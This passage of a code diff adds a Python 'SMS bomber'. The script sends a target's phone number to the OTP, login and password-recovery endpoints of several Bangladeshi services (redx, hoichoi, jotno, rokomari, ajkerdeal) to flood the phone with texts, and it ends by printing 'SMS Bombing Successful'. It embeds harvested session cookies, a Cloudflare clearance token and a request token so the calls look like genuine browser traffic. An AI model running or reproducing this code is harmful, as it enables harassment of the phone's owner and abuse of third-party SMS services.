+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+    }
+    
+    json_data = {
+        'phoneNumber': num,
+    }
+    
+    f = requests.post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',
+        cookies=cookies,
+        headers=headers,
+        json=json_data,
+    )
+    if f.status_code == 200:
+        sent += 1
+        print(f"\033[1;32m✅ {sent} sms sent successfully.\033[0m")
+        time.sleep(1)
+    else:
+        pass
+
+        
+    # hoichoi
+    if not num.startswith("+88"):
+        num = "+88" + num
+    
+    headers = {
+        'authority': 'prod-api.hoichoi.dev',
+        'accept': '*/*',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/json',
+        'origin': 'https://www.hoichoi.tv',
+        'referer': 'https://www.hoichoi.tv/',
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'cross-site',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+    }
+    
+    json_data = {
+        'phoneNumber': num,
+    }
+    
+    g = requests.post('https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code/resend', headers=headers, json=json_data)
+    if g.status_code == 200:
+        sent += 1
+        print(f"\033[1;32m✅ {sent} sms sent successfully.\033[0m")
+        time.sleep(1)
+    else:
+        pass
+
+                
+    # jotno
+    cookies = {
+        'AWSALB': 'LXD99btGj0/Y8fb2bl2yfIgbirrJTcuxqwj6jW7G3nkcvY3ODRtuB7iig6opXP/bx1cjMWHF2g+h/AHTUNo2fMjWDQ+8Shqgm4G2hPk4yu+oYgJT5wGrAmyoZopjMiVt4qIrhk41Ws2Ru3VvVxfcesOi8isYWcPz/EcO1XKc27uUXKy4v36AZfzBCpJSVQ==',
+        'AWSALBCORS': 'LXD99btGj0/Y8fb2bl2yfIgbirrJTcuxqwj6jW7G3nkcvY3ODRtuB7iig6opXP/bx1cjMWHF2g+h/AHTUNo2fMjWDQ+8Shqgm4G2hPk4yu+oYgJT5wGrAmyoZopjMiVt4qIrhk41Ws2Ru3VvVxfcesOi8isYWcPz/EcO1XKc27uUXKy4v36AZfzBCpJSVQ==',
+    }
+    
+    headers = {
+        'authority': 'gw.jotno.net',
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/json',
+    
+        'origin': 'https://www.jotno.net',
+        'referer': 'https://www.jotno.net/',
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'x-request-source': 'web',
+    }
+    
+    json_data = {
+        'userType': 'CONSUMER',
+        'username': num,
+        'apiKey': '03AFcWeA7Vom9T6jToVPVSUp5LUyT5bDVd69tCAkRci5v3XU5q976aCaOXQn9M4LnhlLl6bu4oJJ-VgkVZIyYrdA3UFBiPikH-QGX7TUwmLgOTdB8v82vZCZ2LcVVFgpV7wIaShN6ISYKJbcb5IFIbcohjKln1nQI1dq9rQ_CzWmh8qrfWkJ3ugBeaLIwVjNlNwleYh6PpE2UY9Tj-b80sQgVVRYlfkLGXRi1mKe3GCk-0K-xgwf3Ob6_M3OhC3phIeKrsOjTJJWtB1MEo7eOiVNJAjccJ80aIhZCCavGZRZzqik1i59_J1u_9b6kAO9XFGo6ch0koAa5nXgbJqWwxoxbL_q1-HRkDtFBEWRSymekee6vYOXlUt_NGRSRQQRo_0LNY1J_02N2_ur2nBzHmgnVJImUs-fKrfLJ6g4aMYtpjK1AFIxzU1KwZiuNMh4C2Mb5R3ORE_1eDMfHFTPLEdUglK34aC8_ggpvulvwigJiVZD-brIyESd_aFn9z1K79PTbHhWZrQKuDnhKNWl1qfb7Ns9HDXoT_7R1YHl6syEjpQ758nEWr8LQ8kmsfKm-xGVRAO7QHLnm5EpUXzDecXF7I6WZsax5qLemLWggwje4oztakL52nKWhyDRXbmWWfDWANXC67O5nq0EyJ0ssuk_Mo14qI4ESqoHe0ieJIJIbYl-wkheERo6jccvYW_DhM8ZfMjVPSb3KI8Ui5TczbuRme5SAeqSJQ5SPPsyJz2gJhYXXQUasrglQLC6qQHcLmQc1ZAdeGl_VSm-lPHmt-L9cDj6A4UhPdqOj1Xa0Pv5yQdJeaFHdkm5EtrfXNdxquWdbfiH8fjrD6-A8U5mEzFVJLthndQFKwti5ic38rKKpr9DlVhAFG2gzQjHzya6FmfvbdjqzQpF_yDSsQBzej1gMbNjoH2vXK1oDwCtJBaSzG5gNA_Y6Pjsh67Fp0bc5RfmWbhsbN_qXFjfuECGVqRokNnIMB-2gQm-Ej_HsIRsknswuFUG5tjezgFSoIVTh03HQ1f-udy8qjIRjrDdN_cA6z8hCxg580XqAe3AmNMgb_nNQBukK3qCZVLPm4EMMavfjZ9c4EC4SyasjLo3EJvqcOrm-NGukrg8FDFpvcMuwNrl67eP57KNfDMr1YRIKqDz_vN5CtpLldfwaO4D3hJUMa7o3ADJh_vtT-gyEtBAq-mAgEn7nj8dE47DGt8DIl5cF_7b2IUqbFywq6MMXLk1GPTZvbyqKxA_F4LCYCgNWRbsc6FU9ijq3mZmDMaJExEJud2kaDQGqQWyI39NjLZ6DlT7BViFo0306h2puCmE30g4xcL6W5avZkdgTaBUgtqPhyt6kGpjtJoL7CVeGvI0t8Ngv70zv_IUDPJGosbgEkAdkcQNOkCH4m2Oa47cg3DjYNI3tZ8W2sMZSpv-IRWuymugLSHjm2f2PDGSYqJwsV4eBUxhT7MI63A4fvrQrXSpPAfc0nciighyUU2QdeV6BzqODSswBO4Ad_QdYb_KrTpd7KR44ebBH4nSybHMtl38Q81EpF--bLhh0P9YmTLKEPROkCWhU2CWIw-BPZJMXgcVCsWHMRuJbZHxQnwYM0QWYExRvmQ-w9hkNl26HE3OfIWkMBASyPAMUD1GG-zQIib0PXpRGOZ_WfWewOtG4zzkfnwtvYyLXS16XjnmMiU2RZTsK_c9i6_S1fpGkf6fgRrZaBf_OEY1bIH_yu0EMDrkVZYIV_39JijFUj4VMMWlUgEnt9-KZ5_gSGrpCJoyeJlaMTnKL2VVn9jCZ-TcH_ZbLSRcS5jJGZXH7SR16evt88xLQHbD8FbsNxgJpCrWCBxuiuZMYY18tKnY0PROJjroxRz5BS7mfA05Rt3lVH6CBXFeXfQEtrsRiRBTx4tp4df5TxIq07ZjXx-ukkLFrTp0rXwVZ9uwrceh0PKhP--l2bx43broUvSJLfG5O4-Jaw9IFiE15ESVmEusbuUml_Y0K-26jF3xSGpdXFESf8LPTnwb9Zl8Gw_g8nthd9e7f6fZSgobA6dh-cwe1MT7O0ITCG29Er1_StBLoaQX5gfDP3ujLR36uS7DjfD14RSOMOr1DB6OulNt4q4ufsbmgBaHLQ5PaNlM6qVCbKfipbj2g67taoEXVTtMwgHJv_OlJ3owQjHU5KEmHvOSvC8j9SQU6hpMrlIQR0',
+    }
+    
+    h = requests.post('https://gw.jotno.net/auth/login/token', cookies=cookies, headers=headers, json=json_data)
+    if h.status_code == 200:
+        sent += 1
+        print(f"\033[1;32m✅ {sent} sms sent successfully.\033[0m")
+        time.sleep(1)
+    else:
+        pass
+
+                  
+    # rokomari
+    if not num.startswith("+88"):
+        num = "+88" + num
+        cookies = {
+            'JSESSIONID': 'd1328198-e00c-4fc9-b091-2479d62973d4',
+            'userActTraSerBrowId': 'c146df39-5590-43fe-b65b-756906cc412b',
+            'userActTraSerSessId': '75411431-a07b-48d0-beb1-2ab57e6acf6b',
+            '_gcl_au': '1.1.672599153.1754205960',
+            '_gid': 'GA1.2.313656100.1754205962',
+            '_gat': '1',
+            '_gat_UA-28456258-1': '1',
+            '_fbp': 'fb.1.1754205963238.190392695153971306',
+            '_clck': 'ubuyem%7C2%7Cfy5%7C0%7C2041',
+            'nt_req_con_indx': '["nt_all_index"]',
+            'nt_pop_shown': '["nt_all_pop_shown"]',
+            'cf_clearance': 'Dm6S9bVHLzI1GBXAMK08sk5hYnUym43cnVMW07BvVhk-1754205970-1.2.1.1-xFbKVPgeUOz.iNeYPJ9wv_OwcNyrGwLvUmFzJZMWN.fD5yeSXSylEurLgtkERTHarr0yRcAMcKFEI464vXiBF2c_INEOndcxiBLLW4hwAW.MMA6yp4.I4_iksm_idA4Pv9FumSQ9kQL3tGYXskTB49KreZprSdMT1UBdI8ihgDtdcp.WI.fJuOBjXySrW2MjSehsztFlhB0DNS_xTzmaveNzSeOB788khxiTJd_5Lcs',
+            'sururl': 'aHR0cHM6Ly93d3cucm9rb21hcmkuY29tL2xvZ2lu',
+            '_ga': 'GA1.2.2047015479.1754205962',
+            '_ga_N8S2Z6QJVP': 'GS2.1.s1754205961$o1$g1$t1754205978$j43$l0$h0',
+            '_clsk': '13xxp1p%7C1754205979228%7C2%7C1%7Ci.clarity.ms%2Fcollect',
+        }
+        
+    headers = {
+            'authority': 'www.rokomari.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+        
+            'origin': 'https://www.rokomari.com',
+            'referer': 'https://www.rokomari.com/login',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+            'x-requested-with': 'XMLHttpRequest',
+        }
+        
+    params = {
+            'emailOrPhone': num,
+            'countryCode': 'BD',
+        }
+        
+    i = requests.post('https://www.rokomari.com/otp/send', params=params, cookies=cookies, headers=headers)
+    if i.status_code == 200:
+        sent += 1
+        print(f"\033[1;32m✅ {sent} sms sent successfully.\033[0m")
+        time.sleep(1)
+    else:        
+        pass
+
+                
+    # ajkerdeal
+    headers = {
+        'authority': 'api.ajkerdeal.com',
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/json',
+        'origin': 'https://corporate.ajkerdeal.com',
+        'referer': 'https://corporate.ajkerdeal.com/',
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+    }
+    
+    json_data = {
+        'MobileOrEmail': num,
+        'Type': 2,
+        'CustomerId': None
+    }
+    
+    j = requests.post('https://api.ajkerdeal.com/recover/retrivepassword/appcustomersignup', headers=headers, json=json_data)
+    if j.status_code == 200:
+        sent += 1
+        print(f"\033[1;32m✅ {sent} sms sent successfully.\033[0m")
+        time.sleep(1)
+    else:        
+        pass        
+        
+                
+    
+b = "\n\n\n\t\t\033[1;33m🔥 SMS Bombing Successful.\033[0m\n\n\n"
+for i in b:
+    sys.stdout.write(i)
+    sys.stdout.flush() 
+    time.sleep(0.09)
+    
+    
+    
+#print(response.status_code)
+#print(response.text)                                                         
